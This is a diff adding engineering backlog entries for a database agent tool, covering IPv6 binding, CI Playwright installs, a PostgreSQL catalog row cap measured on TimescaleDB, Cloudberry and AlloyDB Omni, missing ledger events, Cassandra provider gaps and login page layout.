+development host - `--sysctl net.ipv6.bindv6only=1`, `--sysctl net.ipv6.conf.all.disable_ipv6=1`,
+`--network host`, an IPv6-only Docker network - still binds `::` successfully, and the `bindv6only`
+case still serves IPv4 because libuv clears `IPV6_V6ONLY`. The one configuration that would make
+`socket(AF_INET6)` fail outright is a kernel built without IPv6 (`CONFIG_IPV6=n`) or with the
+module unloaded, and that could not be constructed to run the image against. The `ipv6-unavailable`
+branch is covered by unit tests with an injected failure, and the failure mode if it is wrong is
+loud (the server exits) rather than silent.
+
+Done when the image has been started once on a host with no `AF_INET6` and observed to log
+`ipv6-unavailable` and bind `0.0.0.0` - or when that configuration is judged rare enough that the
+unit test is the whole answer, and this entry is deleted.
+
+### U16. release-artifacts.yml's Playwright installs lost `--with-deps` without a live run to prove it
+
+The deb/rpm/snap channel E2Es in `release-artifacts.yml` now run `bunx playwright install chromium`
+instead of `--with-deps chromium`, the same edit made in `docker-build-push.yml`. The reasoning is
+identical and the evidence is real - `ubuntu-latest` ships Google Chrome, so chromium's shared
+libraries are already present, and `playwright.channel.config.ts` is a chromium-only project list
+that never resolves the webkit project which is what actually needs extra packages.
+
+What is missing is a live run. `release-artifacts.yml` triggers only on a tag, so neither a PR nor a
+branch push exercises it; the ci.yml and docker-build-push.yml edits were both verified by real runs
+on the branch, and this one was not. If chromium fails to launch there, the failure surfaces as a red
+channel E2E during a release rather than before it - `run_playwright` calls `playwright test`
+directly, so it fails loudly rather than skipping, but it fails at the worst moment.
+
+Done when the next release's channel E2Es pass on deb, rpm and snap, and this entry is deleted - or
+they fail and `--with-deps` comes back for those three jobs only.
+
+### B52. The PostgreSQL grounding capture's row cap is reached by what the image ships, not by a wide user schema
+
+`composeCatalogRead` records a known limitation with a number: the PostgreSQL projection is one row
+per COLUMN against `maxResultRows: 200`, so an unnarrowed call "overflows at roughly 25 tables of
+eight columns". That estimate frames the cap as something a large user schema reaches.
+
+Measured on 2026-08-20 against a stock `timescale/timescaledb:latest-pg17` (TimescaleDB 2.29.2 on
+PostgreSQL 17.11), it is reached with **two user tables**. `information_schema.columns` outside
+`pg_catalog` and `information_schema` answers **478 rows**, of which **473 belong to the extension**
+- `timescaledb_information` 163, `_timescaledb_internal` 146, `_timescaledb_catalog` 139,
+`_timescaledb_config` 17, `timescaledb_experimental` 8 - and **5 are the user's**. The read is
+refused rather than truncated, by design, so `captureFromProvider` returns an unavailable capture and
+the plan run answers ungrounded with "This run was given no inventory of this database."
+
+Verified as server-caused rather than product-wide: the identical run against plain PostgreSQL 18
+with the same least-privilege role captured "3 tables, fingerprint ctx_0d63" and named them. Granting
+the agent role USAGE and SELECT on the three internal schemas does not change the outcome, which
+confirms this is the row cap and not a privilege.
+
+**A second engine reproduces it, and it is not an extension.** Measured on 2026-08-20 against
+`woblerr/cloudberry:2.1.0-incubating` (Apache Cloudberry 2.1.0-incubating, PostgreSQL 14.4) with the
+same two user tables: the read is refused as `CATALOG_READ_REFUSED`, "Read-only execution exceeded the
+row budget: 289 rows > 200 allowed". Of those **289 rows**, **282 belong to Cloudberry's own
+`gp_toolkit` schema** and 7 to the user's two tables. The figure is per-role and is meaningless
+without one: the same read as `gpadmin` answers **481 rows** - 470 `gp_toolkit`, 7 `public`, 4
+`pg_ext_aux` - because that role can see more. Cloudberry is a PostgreSQL fork rather than a
+PostgreSQL carrying an extension, so what generalises is narrower than the first measurement
+suggested: any PostgreSQL-wire server whose own catalogs are wide before the user creates anything.
+
+Cloudberry also fails one step earlier, which matters for anyone trying to work around this. Its usual
+login is `gpadmin`, a superuser, and the agent's execution profile refuses that role as unverified or
+too broad (`is_superuser`, `reads_server_files`, `writes_server_files`, `executes_programs`). So the
+row budget is only reached after a least-privilege `agentUser` has been created by hand - and it is
+then reached anyway.
+
+**A third engine settles which fix is viable, and it is not the schemas.** Measured on 2026-08-20
+against `google/alloydbomni:17.9.0` (AlloyDB Omni 17.9.0, PostgreSQL 17.9) with the same two user
+tables: `CATALOG_READ_REFUSED`, "Read-only execution exceeded the row budget: 536 rows > 200 allowed".
+Only **7 of those 536 rows are the user's** - `customers` 3 columns and `orders` 4. As the agent role
+sees it the total splits `public` **348**, `google_ml` 144, `ai` 44 - and **341 of the 348 in `public`
+are the 49 extension views the image installs into `public` itself**, not into a schema of its own.
+
+That is what makes this measurement decisive rather than a third repetition. On TimescaleDB (473 of
+478 in `_timescaledb_*`) and on Cloudberry (282 of 289 in `gp_toolkit`) the overflow sits in a
+separate internal schema, so the second candidate fix - have the capture exclude the schemas the
+object browser already treats as internal - would rescue both. Here it rescues nothing: narrowing the
+capture to `schema=public` still refuses, at **348 rows against the 200 allowed**, because the views
+are in the user's own schema. The only selector that fits is a single table (`schema=public
+table=orders` projects 4 rows), which is not a schema capture at all. **So of the two candidate fixes
+only the first survives: aggregate columns per table so the projection is one row per OBJECT
+(symmetric with the SQLite side).** The schema-exclusion fix is refuted by the AlloyDB Omni
+measurement and should not be attempted.
+
+Two controls keep the AlloyDB numbers attributable. Plain PostgreSQL 18.4, run in the same pass,
+projects **7 rows** and captures its 2 tables, so the path is fine. And the `relations` capture kind
+projects 0 rows as the agent role and 3 as a superuser on AlloyDB - but the plain PostgreSQL baseline
+behaves identically, so that is PostgreSQL's own privilege rule and **not** an AlloyDB property.
+
+AlloyDB Omni also fails the same step earlier as Cloudberry, for the same reason: as the image's own
+`postgres` superuser both `agent-read-only` and `agent-operations` are refused with
+`PROFILE_PRIVILEGES_TOO_BROAD` (`is_superuser`, `reads_server_files`, `writes_server_files`,
+`executes_programs`). With a hand-made least-privilege role both profiles acquire and `queryReadOnly`
+is present, so the boundary itself works - and the capture is then refused anyway.
+
+The consequence is that the agent is unusable out of the box on TimescaleDB, Cloudberry and AlloyDB
+Omni, and the same shape will appear on any PostgreSQL-wire server whose image ships wide catalogs or
+wide extension views before the user creates anything. Both candidate fixes were listed in the
+existing comment as belonging to the consuming layer; after the third measurement only the
+one-row-per-OBJECT aggregation is left standing.
+
+Done when a plan run against a stock TimescaleDB, one against a stock Cloudberry and one against a
+stock AlloyDB Omni all report a captured schema naming the user's tables, and this entry is deleted.
+
+### B54. A refused grounding capture leaves no trace in the run's own ledger, so B52 cannot be diagnosed from the record
+
+`docs/llms/setup.md` states the rule this entry breaks: "Every run writes its ledger to
+`.workflow-data`, and that is the authority on what a run did." For a capture that SUCCEEDS that is
+true - `investigation.ts` records a `context-captured` event carrying the fingerprint, the table count
+and the whole snapshot. For a capture that is REFUSED it is not: the `capture.kind === "unavailable"`
+branch pushes `planningUngroundedNote(capture.detail, ...)` into the model's prompt and returns
+without recording anything at all.
+
+Measured on 2026-08-20 against a live AlloyDB Omni 17.9.0, in the browser, with a least-privilege
+agent role. The two ledgers side by side are the whole argument:
+
+- Vitess, capture succeeded: `context-captured`, `fingerprint ctx_3ce059ca...`, `tableCount 2`, plus
+  the full snapshot.
+- AlloyDB Omni, capture refused: four events - `run-opened`, `run-started`, `closing-statement`,
+  `run-finished` - and nothing between the second and the third. The 849-byte ledger names no
+  catalog read, no reason code and no row count.
+
+So the only record that the run was ungrounded is the model's own sentence, "This run was given no
+inventory of this database". The reason it was ungrounded - `CATALOG_READ_REFUSED`, 536 rows against
+a 200-row budget, 341 of them extension views in `public` - is computed in `context-snapshot.ts`,
+handed to the model, and then dropped. It is not in the ledger and it is not in the server log
+either: grepping the run's own log for `CATALOG_READ_REFUSED`, `row budget` and `536` finds nothing.
+
+That is worse than a gap in telemetry, because this repo has already recorded the trap it walks into:
+a missing event reads as work that was not needed rather than knowledge that was lost. An operator
+diagnosing B52 on TimescaleDB, Cloudberry or AlloyDB Omni today has to reproduce the run outside the
+product to learn why it had no schema.
+
+Done when a refused capture records an event carrying its `reasonCode` and, where the reason is the
+row budget, the two numbers - rows projected and rows allowed - and a plan run whose capture was
+refused can be explained from its ledger alone, and this entry is deleted.
+
+### U17. Four things the Cassandra provider declined to do, and the one grammar fact this repo cannot express
+
+The provider shipped in #424 Phase 4 with four bounded absences. None is a defect - each is the
+honest answer to something measured on Apache Cassandra 5.0.9 - but each is a thing a later change
+could take further, and one of them is a shared-reader limitation rather than a provider decision.
+
+**1. `SqlGrammar` cannot express CQL's comment rules, so the provider works around them.** Two facts,
+both measured: CQL has a THIRD line-comment form, `//`, which the readers in `src/lib/sql/` know
+nothing about; and a line comment of EITHER form must be closed by a NEWLINE - `SELECT * FROM
+probe.customers LIMIT 3 -- note` with nothing after it is `line 1:45 mismatched character '<EOF>'
+expecting set null`, while the same text plus `\n` returns the rows. The shared limiter's
+insert-before-trailing-trivia rewrite (#280) therefore turns a VALID statement into a syntax error on
+this one engine, because `sql.trim()` drops the newline that closed the comment.
+`CassandraProvider.prepareQuery` declines to rewrite any statement whose rewritten form would end
+inside a line comment, which is fail-safe (the statement runs unbounded and `wasLimited: false` says
+so). Widening `SqlGrammar` with a `lineComment` fact would fix it properly and would change how every
+dialect's comments are read, so it is a change with its own tests rather than a rider on a provider.
+
+**2. A statement whose last clause is `PER PARTITION LIMIT n` is left unbounded.** The shared reader
+sees a trailing `LIMIT n` and reports the statement as already bounded, so nothing is injected. `...
+PER PARTITION LIMIT 2 LIMIT 3` is valid CQL (measured), so a bound COULD be added - but only by
+stripping the clause the reader matched, which would corrupt the statement. Fixing it needs the
+reader to distinguish the two clauses.
+
+**3. TLS is wired and unverified.** `cassandraClientOptions` maps the connection's SSL mode onto the
+driver's `sslOptions` (`require` -> `rejectUnauthorized: false`, `verify-*` -> `true`, plus a CA when
+one is supplied), and the shape is pinned by unit tests. Neither probe instance speaks TLS, so no
+handshake was ever performed. The alternative - ignoring the form's SSL panel - would have sent
+plaintext to a TLS port silently, which is worse.
+
+**4. Tracing is not exposed.** Cassandra's only substitute for EXPLAIN is `{traceQuery: true}` plus
+`system_traces.sessions` / `system_traces.events`, which describes a statement that has ALREADY RUN.
+It is a profile, not a plan, and `supportsExplain` is false. If it is ever surfaced it must not be
+called EXPLAIN and must not be wired to `explainFormat`.
+
+Also open, and tracked here rather than as an issue: **ScyllaDB has no gate-4 probe.** It speaks the
+CQL wire and `cassandra-driver` connects to it, which is exactly the "connects, therefore supported"
+claim `src/lib/db/compatibility.ts` refuses to record. The parts most likely to differ are the ones
+that are not the wire: `system_views` is Cassandra's own virtual-table set, `gossip_generation` is a
+Cassandra field, and Scylla's version string is not `release_version`-shaped. And there is **no
+`e2e/cassandra-provider.spec.ts`**, unlike Trino: the container takes about 206 seconds to reach
+`nodetool status` UN from cold, which is longer than any existing e2e fixture waits.
+
+Done when each of the four has either been taken further or judged settled, when ScyllaDB has been
+probed or ruled out, and this entry is deleted.
+
+### U18. The login hero has no vertical slack left, and the relatives line spends 56px it does not have
+
+Measured on the built app (`next start`, Chromium), the same page before and after the change that
+added the wire-compatible relatives line:
+
+| Viewport | Before | After | Sign-in card |
+| --- | --- | --- | --- |
+| 1440x900 | page 900px, no scroll | page 900px, no scroll | above the fold in both |
+| 1280x800 | page 800px, no scroll | **page 856px, scrolls 56px** | above the fold in both |
+| 1920x1080 | page 1080px, no scroll | page 1080px, no scroll | above the fold in both |
+| 390x844 | page 991px (already scrolls) | page 1062px | above the fold in both |
+
+The cause is not the line's height alone. At 1280x800 the hero column measured **exactly 800px before
+the change** - the content block was 489px and the chrome around it took the rest, so the column had
+**zero slack** and the `mt-auto` above it had nothing left to absorb. Any block added anywhere in that
+column scrolls the page at that height; one more row of engine pills would do it too.
+
+What was already spent to reduce it: folding the relatives line into the pills' own block instead of
+the hero's 32px rhythm (20px), `leading-snug` instead of `leading-relaxed` (12px), and a shorter lead
+sentence (one line, 16px) - 104px of overflow brought down to 56px. Reaching zero means taking height
+out of a block that is not the relatives line, which is a decision about what the hero says rather
+than about how this line is set: the candidates are the `platform-line` ("Runs on Linux · macOS ·
+Windows", 20px plus its gap), the h1's two-line setting at 1280px, and the `connection-signature`'s
+`text-xl` at that width.
+
+The harm today is bounded and worth stating plainly: the sign-in card is unaffected at every measured
+size, and what falls below the fold at 1280x800 is the bottom of the hero (the community row) plus the
+column's own top padding, which collapses first. It is not the failure `login-form.tsx`'s comment
+records - a hero that measured 1294px in a 900px viewport and pushed the sign-in card itself down.
+
+Done when the hero fits at 1280x800 with the relatives line intact, or when scrolling at that height
+is accepted deliberately and this entry is deleted.
